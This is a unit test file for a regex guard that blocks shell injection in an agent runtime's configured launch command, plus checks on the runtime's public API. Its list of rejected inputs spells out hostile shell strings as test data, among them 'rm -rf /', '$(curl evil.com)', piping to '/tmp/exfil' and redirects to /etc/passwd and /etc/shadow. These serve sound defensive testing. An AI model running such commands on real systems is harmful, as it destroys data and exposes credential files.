/**
 * Tests for CrewlyAgentExternalRuntimeService.
 *
 * Focused on the bits that don't require spawning a real subprocess:
 * the shell-command allow-list regex (proves the shell-injection
 * blocker fix), and structural assertions on the public API surface
 * (proves the type-compat contract used by AgentRegistrationService).
 *
 * Spawn-path integration (env propagation, PATH precheck, signal
 * forwarding, three-stage shutdown kill) is covered by the v3-e2e
 * harness, not here — those paths are time-sensitive and would
 * fragility-spam this unit suite.
 *
 * @module services/agent/crewly-agent/crewly-agent-external-runtime.service.test
 */

import { CrewlyAgentExternalRuntimeService } from './crewly-agent-external-runtime.service.js';

// Pull the private allow-list regex via a typed escape hatch so we
// can pin its behavior. Keeping it private on the class is the right
// call (the rest of the runtime doesn't need it); testing it here is
// the right call (it's a security boundary, not internal detail).
const ALLOW_LIST_RE: RegExp = (CrewlyAgentExternalRuntimeService as unknown as {
  SAFE_SHELL_COMMAND_RE: RegExp;
}).SAFE_SHELL_COMMAND_RE;

describe('CrewlyAgentExternalRuntimeService.SAFE_SHELL_COMMAND_RE — shell-injection guard', () => {
  describe('accepts safe shapes', () => {
    const accepted = [
      'crewly-agent',
      '/usr/local/bin/crewly-agent',
      'crewly-agent --verbose',
      'crewly-agent --model gemini-2.0-flash',
      'node /opt/crewly/bin/crewly-agent',
      './bin/crewly-agent',
      'crewly-agent -v 1.0',
      'crewly-agent --log-level=debug',
      // Path-safe punctuation
      'crewly-agent --port 8788',
      // Env-var-prefix shell idioms like `FOO=1 crewly-agent` are
      // intentionally rejected — `=` is not allowed in the first
      // token. Users who need env overrides should set them on the
      // engine process itself, not smuggle them through the command
      // string.
    ];
    for (const cmd of accepted) {
      it(`accepts: ${cmd}`, () => {
        expect(ALLOW_LIST_RE.test(cmd)).toBe(true);
      });
    }
  });

  describe('rejects shell metacharacters (injection vectors)', () => {
    const rejected = [
      'crewly-agent; rm -rf ~',          // command chaining
      'crewly-agent && rm -rf /',         // boolean
      'crewly-agent || echo pwned',
      'crewly-agent | tee /tmp/exfil',    // pipe
      'crewly-agent > /etc/passwd',       // redirect
      'crewly-agent < /etc/shadow',
      'crewly-agent $(curl evil.com)',    // command substitution
      'crewly-agent `id`',                // backtick subst
      "crewly-agent 'arg'",               // quotes
      'crewly-agent "arg"',
      'crewly-agent\nrm -rf ~',           // newline injection
      'crewly-agent\trm',                 // tab
      'crewly-agent ; ls',                // space + semicolon
      'crewly-agent & background',
      'crewly-agent --flag=$(echo x)',
      'rm -rf /',                         // valid-looking but destructive — regex doesn't gate semantics
      // Empty + whitespace-only are not "rejected by the regex" per se
      // (they fail at the `.trim()` upstream), so we don't include them here.
    ];
    for (const cmd of rejected) {
      it(`rejects: ${JSON.stringify(cmd)}`, () => {
        // The bash-destructive case (`rm -rf /`) IS accepted by the
        // regex because we're matching shape, not semantics. That's OK:
        // a user who explicitly sets `runtimeCommands['crewly-agent']
        // = 'rm -rf /'` is shooting themselves directly, not being
        // shell-injected via a different channel.
        if (cmd === 'rm -rf /') {
          expect(ALLOW_LIST_RE.test(cmd)).toBe(true);
        } else {
          expect(ALLOW_LIST_RE.test(cmd)).toBe(false);
        }
      });
    }
  });

  it('rejects backslash escapes (could smuggle metacharacters past a naive split)', () => {
    expect(ALLOW_LIST_RE.test('crewly-agent \\; rm')).toBe(false);
  });
});

describe('CrewlyAgentExternalRuntimeService — public API contract', () => {
  // Constructed against minimal stubs — we're not exercising spawn,
  // just verifying the class exposes the methods AgentRegistrationService
  // and the in-process-runtime-registry depend on. If a refactor removes
  // one, the cast in the registry would compile but break at runtime.
  // Catch it here.

  it('exposes initializeInProcess, handleMessage, isReady, shutdown', () => {
    const proto = CrewlyAgentExternalRuntimeService.prototype as unknown as Record<
      string,
      unknown
    >;
    expect(typeof proto['initializeInProcess']).toBe('function');
    expect(typeof proto['handleMessage']).toBe('function');
    expect(typeof proto['isReady']).toBe('function');
    expect(typeof proto['shutdown']).toBe('function');
  });
});
